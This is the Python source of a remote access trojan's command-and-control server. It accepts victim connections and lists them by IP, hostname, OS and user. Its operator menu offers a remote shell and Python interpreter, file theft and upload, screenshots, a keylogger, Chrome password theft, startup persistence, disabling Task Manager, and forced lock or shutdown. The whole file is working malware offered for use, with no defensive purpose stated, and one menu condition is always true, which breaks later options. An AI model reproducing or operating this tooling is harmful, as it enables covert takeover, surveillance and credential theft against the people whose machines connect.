import socket, os, time, threading, sys,json
from queue import Queue
from cryptography.fernet import Fernet

arrAddresses = []
arrConnections = []

strHost = "0.0.0.0"
intPort = 3000

intBuff = 1024

queue = Queue()

# function to return string with quotes removed
remove_quotes = lambda string: string.replace("\"", "")

# function to return title centered around string
center = lambda string, title: f"{{:^{len(string)}}}".format(title)

# function to send data
send = lambda data: conn.send(objEncryptor.encrypt(data))

# function to receive data
recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))


def recvall(buffer):  # function to receive large amounts of data
    bytData = b""
    while len(bytData) < buffer:
        bytData += conn.recv(buffer)
    return objEncryptor.decrypt(bytData)


def sendall(flag, data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(f"{flag}{intDataSize}".encode())
    time.sleep(0.2)
    conn.send(bytEncryptedData)
    print(f"Total bytes sent: {intDataSize}")


def create_encryptor():
    global objKey, objEncryptor
    objKey = Fernet.generate_key()
    objEncryptor = Fernet(objKey)


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
    except socket.error() as strError:
        print(f"Error creating socket {strError}")


def socket_bind():
    global objSocket
    try:
        print(f"Listening on port {intPort}")
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as strError:
        print(f"Error binding socket {strError} Retrying...")
        socket_bind()

def socket_accept():
    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1)  # no timeout
            address += tuple(json.loads(conn.recv(intBuff).decode()))
            conn.send(objKey)
            arrConnections.append(conn)
            arrAddresses.append(address)
            print(f"\nConnection has been established: {address[0]} ({address[2]})")
        except socket.error:
            print("Error accepting connections!")
            continue


def _decode(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode("cp437")
        except UnicodeDecodeError:
            return data.decode(errors="replace")


def menu_help():
    print("\nH help")
    print("L List all connections")
    print("I Interact with connection")
    print("E Open remote cmd with connection")
    print("S Send command to every connection")
    print("C Close connection")
    print("X Exit and close all connections")


def main_menu():
    while True:
        strChoice = input("\n>> ").lower()

        refresh_connections()  # refresh connection list

        if strChoice == "l":
            list_connections()

        elif strChoice[:1] == "i" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], True)
            if conn is not None:
                send_commands()
        elif strChoice == "h":
            menu_help()

        elif strChoice[:1] == "c" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], False)
            if conn is not None:
                send(b"exit")
                conn.close()

        elif strChoice == "x":
            close()
            break  # break to continue work() function

        elif strChoice[:1] == "e" and len(strChoice) > 1:
            conn = select_connection(strChoice[2:], False)
            if conn is not None:
                command_shell()

        elif strChoice[:1] == "s" and len(strChoice) > 1:
            send_command_all(strChoice[2:])
        else:
            print("Invalid choice, please try again!")
            menu_help()


def close():
    global arrConnections, arrAddresses, conn

    if len(arrAddresses) == 0:  # if there are no computers connected
        return

    for _, conn in enumerate(arrConnections):
        send(b"exit")
        conn.close()
    del arrConnections
    arrConnections = []
    del arrAddresses
    arrAddresses = []


def refresh_connections():  # used to remove any lost connections
    global arrConnections, arrAddresses, conn
    for intCounter, conn in enumerate(arrConnections):
        try:
            send(b"test")  # test to see if connection is active
        except socket.error:
            del arrAddresses[arrConnections.index(conn)]
            arrConnections.remove(conn)
            conn.close()


def list_connections():
    refresh_connections()

    if not len(arrConnections) > 0:
        print("No connections.")
        return

    strClients = ""
    for intCounter, arrAddress in enumerate(arrAddresses):
        strClients += f"{intCounter}"
        for value in arrAddress:
            strClients += f"{4 * ' '}{str(value)}"
        strClients += "\n"

    strInfo = f"\nID{3 * ' '}"
    for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
        strInfo += center(f"{arrAddresses[0][index]}", text) + 4 * " "
    strInfo += f"\n{strClients}"
    print(strInfo, end="")


def select_connection(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = arrConnections[connection_id]
    except:
        print("Invalid choice, please try again!")
        return
    else:
        '''
        IP, PC Name, OS, User
        '''
        arrInfo = tuple()
        for index in [0, 2, 3, 4]:
            arrInfo += (f"{arrAddresses[connection_id][index]}",)

        if blnGetResponse:
            print(f"You are connected to {arrInfo[0]} ....\n")
        return conn


def send_command_all(command):
    if os.path.isfile("command_log.txt"):
        open("command_log.txt", "w").close()  # clear previous log contents

    for intCounter in range(0, len(arrAddresses)):
        conn = select_connection(intCounter, False)

        if conn is not None and command != "cmd":
            send_command(command)


def user_info():
    for index, text in enumerate(["IP: ", "PC Name: ", "OS: ", "User: "]):
        print(text + arrInfo[index])


def screenshot():
    send(b"screen")
    strScrnSize = recv(intBuff).decode()  # get screenshot size
    print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")

    intBuffer = int(strScrnSize)

    strFile = time.strftime("%Y%m%d%H%M%S.png")

    ScrnData = recvall(intBuffer)  # get data and write it
    with open(strFile, "wb") as objPic:
        objPic.write(ScrnData)

    print(f"Done!\nTotal bytes received: {os.path.getsize(strFile)} bytes")


def browse_files():
    send(b"filebrowser")
    print("\nDrives :")

    strDrives = recv(intBuff).decode()
    print(f"{strDrives}\n")

    strDir = input("Directory: ")

    if strDir == "":
        # tell the client of the invalid directory
        strDir = "Invalid"

    send(strDir.encode())

    strClientResponse = recv(intBuff).decode()  # get buffer size

    if strClientResponse == "Invalid Directory!":  # if the directory is invalid
        print(f"\n{strClientResponse}")
        return

    intBuffer = int(strClientResponse)
    strClientResponse = recvall(intBuffer).decode()  # receive full data

    print(f"\n{strClientResponse}")


def startup():
    send(b"startup")
    print("Registering ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(strClientResponse)


def remove_from_startup():
    send(b"rmvstartup")
    print("Removing ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(strClientResponse)


def send_file():
    strFile = remove_quotes(input("\nFile to send: "))
    if not os.path.isfile(strFile):
        print("Invalid File!")
        return

    strOutputFile = remove_quotes(input("\nOutput File: "))
    if strOutputFile == "":  # if the input is blank
        return

    with open(strFile, "rb") as objFile:
        sendall("send", objFile.read())

    send(strOutputFile.encode())

    strClientResponse = recv(intBuff).decode()
    print(strClientResponse)


def receive():
    strFile = remove_quotes(input("\nTarget file: "))
    strFileOutput = remove_quotes(input("\nOutput File: "))

    if strFile == "" or strFileOutput == "":  # if the user left an input blank
        return

    send(("recv" + strFile).encode())
    strClientResponse = recv(intBuff).decode()

    if strClientResponse == "Target file not found!":
        print(strClientResponse)
        return

    print(f"File size: {strClientResponse} bytes\nPlease wait...")
    intBuffer = int(strClientResponse)

    file_data = recvall(intBuffer)  # get data and write it

    try:
        with open(strFileOutput, "wb") as objFile:
            objFile.write(file_data)
    except:
        print("Path is protected/invalid!")
        return

    print(f"Done!\nTotal bytes received: {os.path.getsize(strFileOutput)} bytes")


def command_shell():  # remote cmd shell
    send(b"cmd")
    strDefault = f"\n{_decode(recv(intBuff))}>"
    print(strDefault, end="")  # print default prompt

    while True:
        strCommand = input()
        if strCommand in ["quit", "exit"]:
            send(b"goback")
            break

        elif strCommand == "cmd":  # commands that do not work
            print("Please do use not this command!")
            print(strDefault, end="")

        elif len(strCommand) > 0:
            send(strCommand.encode())
            intBuffer = int(recv(intBuff).decode())  # receive buffer size
            strClientResponse = _decode(recvall(intBuffer))
            print(strClientResponse, end="")  # print cmd output
        else:
            print(strDefault, end="")


def python_interpreter():
    send(b"python")
    recv(intBuff)
    while True:
        strCommand = input("\n>>> ")
        if strCommand.strip() == "":
            continue
        if strCommand in ["exit", "exit()"]:
            break
        send(strCommand.encode())
        intBuffer = int(recv(intBuff).decode())
        strReceived = recvall(intBuffer).decode("utf-8").rstrip("\n")
        if strReceived != "":
            print(strReceived)
    send(b"exit")
    recv(intBuff)



def disable_taskmgr():
    send(b"dtaskmgr")
    print(recv(intBuff).decode())  # print response

def getchromepass():
    send(b'getchromepass')
    while True:
        print(recv(intBuff).decode())
    

def keylogger(option):
    if option == "start":
        send(b"keystart")
        if recv(intBuff) == b"error":
            print("Keylogger is already running.")

    elif option == "stop":
        send(b"keystop")
        if recv(intBuff) == b"error":
            print("Keylogger is not running.")

    elif option == "dump":
        send(b"keydump")
        intBuffer = recv(intBuff).decode()

        if intBuffer == "error":
            print("Keylogger is not running.")
        elif intBuffer == "error2":
            print("No logs.")
        else:
            strLogs = recvall(int(intBuffer)).decode(errors="replace")  # get all data
            print(f"\n{strLogs}")


def send_command(command):
    send(("runcmd" + command).encode())
    intBuffer = int(recv(intBuff).decode())  # receive buffer size

    strClientResponse = f"{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{recvall(intBuffer).decode()}{24 * '='}"

    if os.path.isfile("command_log.txt"):
        strMode = "a"
    else:
        strMode = "w"

    with open("command_log.txt", strMode) as objLogFile:
        objLogFile.write(f"{strClientResponse}\n\n")


def show_help():
    print("H Help")
    print("M Send message")
    print("R Receive file from the user")
    print("S Send file to the user")
    print("P Take screenshot")
    print("A (1) Add to startup")
    print("A (2) Remove from startup")
    print("V View files")
    print("U User Info")
    print("E Open remote cmd")
    print("I Open remote python interpreter")
    print("D Disable task manager")
    print("K (start) (stop) (dump) Keylogger")
    print("X (1) Lock user")
    print("X (2) Restart user")
    print("X (3) Shutdown user")
    print('G Get Chrome password')
    print("B Move connection to background")
    print("C Close connection")


def send_commands():
    show_help()
    try:
        while True:
            strChoice = input("\nType selection: ").lower()

            if strChoice == "h":
                print()
                show_help()
            elif strChoice == "c":
                send(b"exit")
                conn.close()
                break
            elif strChoice[:1] == "m" and len(strChoice) > 1:
                strMsg = "msg" + strChoice[2:]
                send(strMsg.encode())
            elif strChoice == "a 1":
                startup()
            elif strChoice == "a 2":
                remove_from_startup()
            elif strChoice == "u":
                user_info()
            elif strChoice == "p":
                screenshot()
            elif strChoice == "i":
                python_interpreter()
            elif strChoice == "v":
                browse_files()
            elif strChoice == "s":
                send_file()
            elif strChoice == "r":
                receive()
            elif strChoice == "x 1":
                send(b"lock")
            elif strChoice == 'g' or 'G':
                getchromepass()
            elif strChoice == "x 2":
                send(b"shutdown")
                conn.close()
                break
            elif strChoice == "x 3":
                send(b"restart")
                conn.close()
                break
            elif strChoice == "b":
                break
            elif strChoice == "e":
                command_shell()
            elif strChoice == "d":
                disable_taskmgr()
            elif strChoice == "k start":
                keylogger("start")
            elif strChoice == "k stop":
                keylogger("stop")
            elif strChoice == "k dump":
                keylogger("dump")
            else:
                print("Invalid choice, please try again!")

    except socket.error as e:  # if there is a socket error
        print(f"Error, connection was lost! :\n{e}")
        return


def create_threads():
    for _ in range(2):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():  # do jobs in the queue
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_encryptor()
            create_socket()
            socket_bind()
            socket_accept()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThread in [1, 2]:
        queue.put(intThread)  # put thread id into list
    queue.join()


create_threads()
create_jobs()
